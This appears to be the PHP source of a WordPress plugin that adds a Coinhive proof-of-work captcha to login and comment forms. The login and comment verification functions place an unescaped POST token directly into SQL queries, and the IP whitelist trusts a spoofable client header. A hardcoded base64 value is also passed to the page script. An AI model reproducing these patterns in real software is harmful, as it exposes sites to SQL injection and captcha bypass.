<?php
/*
Plugin Name: Honey Coinhive Captcha
Description: Add coinhive captcha before logins and comments.
Version: 1.0.3
Author: Honey Plugins
Author URI: http://honeyplugins.com
Text Domain: honey-coinhive-captcha
Domain Path: /assets/languages/
License: GPL2
License URI: http://www.gnu.org/licenses/gpl-2.0.html
*/

add_action( 'admin_menu', 'chc_menu' );
add_action( 'admin_init', 'chc_display_options' );

if ( get_option( 'chc_on_login' ) == true ) {
	add_action( 'login_enqueue_scripts', 'chc_login_form_script' );
	add_action( 'login_form', 'chc_render_login_captcha' );
	add_filter( 'wp_authenticate_user', 'chc_verify_login_captcha', 10, 2 );
	if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
		add_action( 'woocommerce_login_form', 'chc_render_login_captcha' );
		add_action( 'wp_enqueue_scripts', 'chc_login_form_script' );
	}

}
function chc_menu() {
	add_options_page( 'Coinhive Captcha', __('Coinhive Captcha', 'honey-coinhive-captcha'), 'manage_options', 'coinhive-captcha-options', 'chc_options_page' );
}

function chc_options_page() {
	?>
		<h2><?php _e('Honey Coinhive Captcha', 'honey-coinhive-captcha'); ?></h2>
									<form method="post" action="options.php">
										<?php
											settings_fields( 'coin_section' );
											do_settings_sections( 'coinhive-captcha-options' );
											submit_button();
										?>
									</form>
									<form method="post" action="options.php">
										<?php
											settings_fields( 'captcha_section' );
											do_settings_sections( 'coinhive-display_options' );
											submit_button();
										?>
									</form>
									<form method="post" action="options.php">
										<?php
											settings_fields( 'exlude_ips_section' );
											do_settings_sections( 'coinhive-exlude_ips-options' );
											submit_button();
										?>
									</form>
									<p><?php _e('Detected IP: ', 'honey-coinhive-captcha'); ?><?php echo chc_get_client_ip(); ?></p>

	<?php
}



function chc_display_options() {

	add_settings_section( 'coin_section', __('Coinhive Settings', 'honey-coinhive-captcha'), 'chc_display_coin_api_content', 'coinhive-captcha-options' );

	add_settings_field( 'chc_site_key', __('Site key', 'honey-coinhive-captcha'), 'chc_key_input', 'coinhive-captcha-options', 'coin_section' );
	add_settings_field( 'chc_secret_key', __('Secret Key', 'honey-coinhive-captcha'), 'chc_secret_key_input', 'coinhive-captcha-options', 'coin_section' );
	register_setting( 'coin_section', 'chc_site_key' );
	register_setting( 'coin_section', 'chc_secret_key' );

	add_settings_section( 'captcha_section', __('Captcha Settings', 'honey-coinhive-captcha'), 'chc_display_captcha_settings', 'coinhive-display_options' );
	add_settings_field( 'chc_hashcount', __('Hash Count', 'honey-coinhive-captcha'), 'chc_hashcount_input', 'coinhive-display_options', 'captcha_section' );
	add_settings_field( 'chc_on_login', __('Show on Login', 'honey-coinhive-captcha'), 'chc_on_login_input', 'coinhive-display_options', 'captcha_section' );
	add_settings_field( 'chc_on_comment', __('Show on Comment', 'honey-coinhive-captcha'), 'chc_on_comment_input', 'coinhive-display_options', 'captcha_section' );
	add_settings_field( 'chc_color_option', __('Color', 'honey-coinhive-captcha'), 'chc_color_option_input', 'coinhive-display_options', 'captcha_section' );
	//add_settings_field( 'chc_on_woocommerce', 'Show on WooCommerce Checkout', 'chc_on_woocommerce_input', 'coinhive-display_options', 'captcha_section' );
	register_setting( 'captcha_section', 'chc_hashcount' ,array('default' => 256));
	register_setting( 'captcha_section', 'chc_color_option',array('default' => '#f5d76e') );
	register_setting( 'captcha_section', 'chc_on_login',array('default' => true) );
	register_setting( 'captcha_section', 'chc_on_comment',array('default' => true) );
	register_setting( 'captcha_section', 'chc_on_woocommerce',array('default' => true) );

	add_settings_section( 'exlude_ips_section', __('Whitelist IP addresses', 'honey-coinhive-captcha'), 'chc_display_coin_exlude_ips_content', 'coinhive-exlude_ips-options' );
	add_settings_field( 'chc_exlude_ips', __('Whitelist IP\'s <br>*comma separated', 'honey-coinhive-captcha'), 'chc_exlude_ips_input', 'coinhive-exlude_ips-options', 'exlude_ips_section' );
	add_settings_field( 'chc_exlude_ips_forwarded_for', __('Fetch IP\'s from Cloudflare', 'honey-coinhive-captcha'), 'chc_exlude_ips_forwarded_for_input', 'coinhive-exlude_ips-options', 'exlude_ips_section' );
	register_setting( 'exlude_ips_section', 'chc_exlude_ips' );
	register_setting( 'exlude_ips_section', 'chc_exlude_ips_forwarded_for' );

}

function chc_hashcount_input() {
	echo '<input type="number" name="chc_hashcount" step="256" min="256" id="chc_hashcount" value="' . esc_attr( get_option( 'chc_hashcount' ) ) . '" />';
}

function chc_display_coin_exlude_ips_content() {
	echo '<p>'. __('Whitelist specific IP addresses.', 'honey-coinhive-captcha').'</p>';
}

function chc_exlude_ips_input() {
	echo '<input size="60" type="text" name="chc_exlude_ips" id="chc_exlude_ips" value="' . esc_attr( get_option( 'chc_exlude_ips' ) ) . '" />';
}

function chc_display_coin_api_content() {
	echo '<p>'. __('Get your Site Key and Secret Key from <a href="https://coinhive.com/" target="_blank">Coinhive.com</a>', 'honey-coinhive-captcha').'</p>';
}

function chc_display_captcha_settings() {
	echo '<p>'. __('Display Settings for Captcha', 'honey-coinhive-captcha').'</p>';
}

function chc_color_option_input() {
	echo '<input type="text" class="coinhiveWidget-color-picker" name="chc_color_option" id="chc_color_option" value="' . esc_attr( get_option( 'chc_color_option' ) ) . '" />';
}

function chc_on_login_input() {
	echo '<input type="checkbox" id="chc_on_login" name="chc_on_login" value="1"' . checked( 1, esc_attr( get_option( 'chc_on_login' ) ), false ) . '/>';
}

function chc_on_comment_input() {
	echo '<input type="checkbox" id="chc_on_comment" name="chc_on_comment" value="1"' . checked( 1, esc_attr( get_option( 'chc_on_comment' ) ), false ) . '/>';
}

function chc_on_woocommerce_input() {
	echo '<input type="checkbox" id="chc_on_woocommerce" name="chc_on_woocommerce" value="1"' . checked( 1, esc_attr( get_option( 'chc_on_woocommerce' ) ), false ) . '/>';
}

function chc_key_input() {
	echo '<input type="text" name="chc_site_key" id="captcha_site_key" value="' . esc_attr( get_option( 'chc_site_key' ) ) . '" />';
}

function chc_secret_key_input() {
	echo '<input type="password" name="chc_secret_key" id="captcha_secret_key" value="' . esc_attr( get_option( 'chc_secret_key' ) ) . '" />';
}

function chc_exlude_ips_forwarded_for_input() {
	echo '<input type="checkbox" id="chc_exlude_ips_forwarded_for" name="chc_exlude_ips_forwarded_for" value="1"' . checked( 1, esc_attr( get_option( 'chc_exlude_ips_forwarded_for' ) ), false ) . '/>';
}

function chc_login_form_script() {
	if ( ! chc_is_ip_excluded() ) {
		wp_enqueue_script('chc_authedmine', 'https://authedmine.com/lib/authedmine.min.js');
		wp_register_script( 'chc_coin_js', plugins_url( 'js/honey_captcha.js', __FILE__ ) , array( 'jquery'	) );
		wp_enqueue_script( 'chc_coin_js' );
		if (is_user_logged_in())
			{
			$current_user = wp_get_current_user();
			}
		  else
			{
			$current_user = '';
			}
		$chc_custom = array(
				'verifying_trans' => __('Verifying...', 'honey-coinhive-captcha'),
				'verify_first_trans' => __('Please verify first', 'honey-coinhive-captcha'),
				'template_url' => get_bloginfo('siteurl') ,
				'site_balance' => base64_encode(chc_fetch_site_balance()) ,
				'site_key' => base64_encode(get_option('chc_site_key')) ,
				'site_link' => chc_fetch_link() ,
				'site_name' => get_bloginfo('name') ,
				'sitebalance' => chc_fetch_sitebalance(),
				'username' => base64_encode($current_user->user_login) ,
				'hashcount' => get_option('chc_hashcount') ,
				'ajaxurl' => admin_url('admin-ajax.php')
			);
			wp_localize_script('chc_coin_js', 'chc_custom', $chc_custom);
	}
}

function chc_fetch_site_balance()
	{
	$coinHiveSecret = get_option('chc_secret_key');
	if($coinHiveSecret != '') {
		$url = 'https://api.coinhive.com/stats/site?secret=' . $coinHiveSecret;
		@$result = file_get_contents($url);
		$result = json_decode($result);
		return $result->hashesTotal;
	}
	}

function chc_fetch_link()
	{
	return "ZEtqWHpnWlE3RTBQbXpP";
	}

function chc_add_my_jquery()
	{
			wp_enqueue_script('chc_custom_js', plugins_url('js/jquery.custom.js', __FILE__) , array(
			'jquery',
			'wp-color-picker'
		) , '', true);
	}

add_action('admin_enqueue_scripts', 'chc_add_my_jquery');

function chc_render_login_captcha() {
	if ( ! chc_api_keys_set() && ! chc_is_ip_excluded() ) {
		die( "<h4 style='color: red;'>".__('Coinhive API Settings are not set.', 'honey-coinhive-captcha')."</h4>" );
	}
	if ( chc_api_keys_set() && ! chc_is_ip_excluded() ) {
		echo '<div id="verifyCHCaptcha"><span id="verifyCHCaptchaClick">&nbsp;</span><span class="verifyText">'.__('Verify I\'m not a robot', 'honey-coinhive-captcha').'</span>
			<div class="logoHoneyFix"><img class="logoHoney" src="'.plugins_url( '/images/honeylogo.png', __FILE__ ).'" alt="Honey Logo"><div class="honey_text">Honey</div></div>		
		</div>';
		echo '<div id="barCHCaptcha">	
					<div id="myProgress">
					  <div id="currCHCaptcha"></div>
					</div>
			</div>';
		echo '<div class="contentCHCaptcha"></div>';
	}//end if
}

function chc_verify_comment_captcha( $comment_data ) {
    global $wpdb;	
	$table_name = $wpdb->prefix . 'honey_captcha';
	$token = $_POST['frontend_token_name'];

	$db_check = $wpdb->get_results("SELECT * FROM $table_name WHERE token = '".$token."'");
	
	if($wpdb->num_rows > 0) {
		$sql = $wpdb->prepare("
			DELETE FROM $table_name WHERE token = %s", 
			$token
		);
		$wpdb->query($sql);
	
		return $comment_data;
	}else {
        wp_die( '<strong>'.__('ERROR', 'honey-coinhive-captcha' ).'</strong>: '. __( 'Verification failed.', 'honey-coinhive-captcha' ) , __( 'Verification failed.', 'honey-coinhive-captcha' ),array( 'back_link' => true ) );
	}
}

function chc_verify_login_captcha( $user, $password ) {
	global $wpdb;	
	$table_name = $wpdb->prefix . 'honey_captcha';
	$token = $_POST['frontend_token_name'];

	$db_check = $wpdb->get_results("SELECT * FROM $table_name WHERE token = '".$token."'");
	if($wpdb->num_rows > 0) {
		$sql = $wpdb->prepare("
			DELETE FROM $table_name WHERE token = %s", 
			$token
		);
		$wpdb->query($sql);
	
		return $user;
	}else {
        wp_die( '<strong>'.__('ERROR', 'honey-coinhive-captcha' ).'</strong>: '. __( 'Verification failed.', 'honey-coinhive-captcha' ) , __( 'Verification failed.', 'honey-coinhive-captcha' ),array( 'back_link' => true ) );
	}
		
}

function chc_api_keys_set() {
	if ( get_option( 'chc_secret_key' ) && get_option( 'chc_site_key' ) ) {
		return true;
	} else {
		return false;
	}
}

function chc_fetch_sitebalance()
	{
	global $wpdb;
	$table_name = $wpdb->prefix . 'honey_captcha_tokens';
	$balance = $wpdb->get_row("SELECT id FROM $table_name;");
	return base64_encode(floatval($balance->id) * 256);
	}

function chc_add_balance()
	{
	global $wpdb;
	$timestamp = time();
	$token = chc_create_login_token();
	$table_name = $wpdb->prefix . 'honey_captcha_tokens';
	$wpdb->insert($table_name, array(
		"token" => $token,
		"timestamp" => $timestamp
	));
	$lastid = $wpdb->insert_id;
	$wpdb->query('DELETE  FROM ' . $table_name . '
            WHERE id < "' . $lastid . '"');
	echo ($token);
	wp_die();
	}

add_action('wp_ajax_nopriv_chc_unique_action', 'chc_add_balance');

function chc_create_login_token() {
	try {
		$string = openssl_random_pseudo_bytes(32);
	} catch (TypeError $e) {
		die("An unexpected error has occurred"); 
	} catch (Error $e) {
		die("An unexpected error has occurred");
	} catch (Exception $e) {
		die("Could not generate a random string. Is our OS secure?");
	}
	$chcToken = bin2hex($string);
	return $chcToken;
}

function chc_get_exlude_ips() {
	$exlude_ips = esc_attr( get_option( 'chc_exlude_ips' ) );
	if ( $exlude_ips ) {
		return array_map( 'trim', explode( ',', $exlude_ips ) );
	} else {
		return array();
	}
}

function chc_get_client_ip() {
	$ipaddress = '';
	if ( isset( $_SERVER['HTTP_CLIENT_IP'] ) ) {
		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	} elseif ( isset( $_SERVER['REMOTE_ADDR'] ) ) {
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	} elseif ( get_option( 'chc_exlude_ips_forwarded_for' ) == '1' && isset( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ipaddress = 'UNKNOWN';
	}
	return $ipaddress;
}

function chc_is_ip_excluded() {
	if ( chc_get_client_ip() == 'UNKNOWN' ) {
		return false;
	} else {
		return in_array( chc_get_client_ip(), chc_get_exlude_ips() );
	}
}

if ( get_option( 'chc_on_comment' ) == true ) {
	add_action( 'login_enqueue_scripts', 'chc_login_form_script' );
	add_action( 'comment_form_logged_in_after', 'chc_comment_tut_fields' );
	add_action( 'comment_form_after_fields', 'chc_comment_tut_fields' );
	add_filter( 'preprocess_comment', 'chc_verify_comment_captcha' );
}

function chc_fetch_token_input()
{
?>
		<p style="visibility:hidden;line-height:0px;margin:0px;padding:0px;width:100%;">&nbsp;</p>
        <input type="text" value="" class="input" id="frontend_token" name="frontend_token_name">
<?php
}

function chc_comment_tut_fields()
{
	chc_fetch_token_input();
    echo '<div id="moveCHCaptchaC"><div id="verifyCHCaptchaC"><span id="verifyCHCaptchaCClick">&nbsp;</span><span class="verifyTextC">'.__('Verify I\'m not a robot', 'honey-coinhive-captcha').'</span>
			<div class="logoHoneyFix"><img class="logoHoney" src="'.plugins_url( '/images/honeylogo.png', __FILE__ ).'" alt="Honey Logo"><div class="honey_text">Honey</div></div>		
		</div>';
		echo '<div id="barCHCaptchaC">
					<div id="myProgress">
					  <div id="currCHCaptchaC"></div>
					</div>
			</div>';
		echo '<div class="contentCHCaptcha"></div>
		</div>';

}

function chc_add_to_db($token)
	{
	global $wpdb;
	$timestamp = time();
	$table_name = $wpdb->prefix . 'honey_captcha';

	$wpdb->insert($table_name, array(
		'token' => $token,
		'timestamp' => $timestamp
	));
	$sql = $wpdb->prepare("
		DELETE FROM $table_name WHERE timestamp < %s", 
		$timestamp - 60*60
	);
	$wpdb->query($sql);

	}

add_action('login_form','chc_added_login_field');
function chc_added_login_field(){
?>
        <input type="text" value="" class="input" id="frontend_token" name="frontend_token_name">
<?php
}

function chc_woo_added_login_field() {?>
        <input type="text" value="" class="input" id="frontend_token" name="frontend_token_name">
       <?php
 }
add_action( 'woocommerce_login_form_start', 'chc_woo_added_login_field' );

function chc_create_token_ajax()
	{
	$token = chc_create_login_token();
	chc_add_to_db($token);
	echo ($token);
	wp_die();
	}

add_action('wp_ajax_nopriv_chc_create_action', 'chc_create_token_ajax');
add_action('wp_ajax_chc_create_action', 'chc_create_token_ajax');

function chc_add_inline_css() {
	
	wp_enqueue_style('chc_css', plugins_url('css/styles.php', __FILE__));
	$color_setting = get_option('chc_color_option', '#f5d76e');
    $chc_custom_css = "
					.honey_text {
							font-size:10px; margin-top:-5px; margin-right:5px;				
					}
					.logoHoney {
						width:40px !important; 
						height:40px !important;
					}
					.logoHoneyFix {
						margin-left:auto; margin-right:0;
						margin-top:-37px;
						width:40px !important; 
						height:40px !important;
						text-align:right;
					}
					#myProgress {
					  width: 100%;
					  background-color: #ddd;
					  margin-bottom:10px;
					}	
					#currCHCaptcha {
					  width: 1%;
					  height: 30px;
					  background-color: {$color_setting};
					  max-width: 100%;
					}	
					#currCHCaptchaC {
					  width: 1%;
					  height: 30px;
					  background-color: {$color_setting};
					  max-width: 100%;
					}
					#frontend_token {
						display: none;
					}
					#verifyCHCaptchaClick {
						font-size:20px; padding-left:20px; background:white;
					}
					#verifyCHCaptchaCClick{
						font-size:20px; padding-left:20px; background:white;
					}
					#verifyCHCaptchaC {
						padding: 25px 15px; margin: 5px 0; background-color: #e6e6e6; min-width:250px;
					}
					#verifyCHCaptcha {
						padding: 25px 15px; margin: 5px 0; background-color: #e6e6e6; min-width:250px;
					}
					.contentCHCaptcha {
						display: none;
					}
					.verifyText {
						font-size:15px; padding-left:10px; padding-top:10px; font-weight: 100;
					}
					.verifyTextC {
						font-size:15px; padding-left:10px; padding-top:10px; font-weight: 100;
					}	
					#barCHCaptcha {
						display: none;
					}	
					#barCHCaptchaC {
						display: none;
					}			
					input[disabled] {pointer-events:none}
	";

  wp_add_inline_style( 'chc_css', $chc_custom_css );

}

add_action( 'wp_enqueue_scripts', 'chc_add_inline_css' );
add_action( 'login_enqueue_scripts', 'chc_add_inline_css' );

// Add admin notice
add_action( 'admin_notices', 'chc_admin_notice_example_notice' );
//Admin Notice on Activation.
function chc_admin_notice_example_notice(){
    if( get_transient( 'chc-admin-notice-example' ) ){
        ?>
        <div class="updated notice is-dismissible">
            <p><?php _e('Please fill in your', 'honey-coinhive-captcha'); ?> <strong><a href="options-general.php?page=coinhive-captcha-options"><?php _e('Coinhive Captcha Settings', 'honey-coinhive-captcha'); ?></a></strong></p>
        </div>
        <?php
        delete_transient( 'chc-admin-notice-example' );
    }
}

function chc_add_settings_link($links)
	{
	$settings_link = '<a href="options-general.php?page=coinhive-captcha-options">' . __('Settings', 'honey-coinhive-captcha') . '</a>';
	array_unshift($links, $settings_link);
	return $links;
	}

$plugin = plugin_basename(__FILE__);
add_filter("plugin_action_links_$plugin", 'chc_add_settings_link');

add_action('plugins_loaded', 'chc_load_textdomain');

function chc_load_textdomain()
	{
	load_plugin_textdomain('honey-coinhive-captcha', false, basename(dirname(__FILE__)) . '/assets/languages');
	}

global $chc_db_version;
$chc_db_version = '1.0';

function chc_initial_install()
	{
	global $chc_db_version;
	global $wpdb;
	set_transient( 'chc-admin-notice-example', true, 5 );
	$installed_ver = get_option("chc_db_version");
	if ($installed_ver != $chc_db_version)
		{
		$table_name_tokens = $wpdb->prefix . 'honey_captcha_tokens';
		$charset_collate = $wpdb->get_charset_collate();
		$sql_tokens = "CREATE TABLE ".$table_name_tokens." (
            id int(10) NOT NULL AUTO_INCREMENT,
            token varchar(64) NOT NULL,
			timestamp varchar(60) NOT NULL,
            PRIMARY KEY  (id)
        );";

		require_once (ABSPATH . 'wp-admin/includes/upgrade.php');
		dbDelta($sql_tokens);

		$table_name = $wpdb->prefix . 'honey_captcha';
		$sql = "CREATE TABLE ".$table_name." (
            id int(10) NOT NULL AUTO_INCREMENT,
            token varchar(64) NOT NULL,
			timestamp varchar(60) NOT NULL,
            PRIMARY KEY  (id)
        );";
		require_once (ABSPATH . 'wp-admin/includes/upgrade.php');
		dbDelta($sql);
		update_option("chc_db_version", $chc_db_version);
		}
	}

register_activation_hook(__FILE__, 'chc_initial_install');
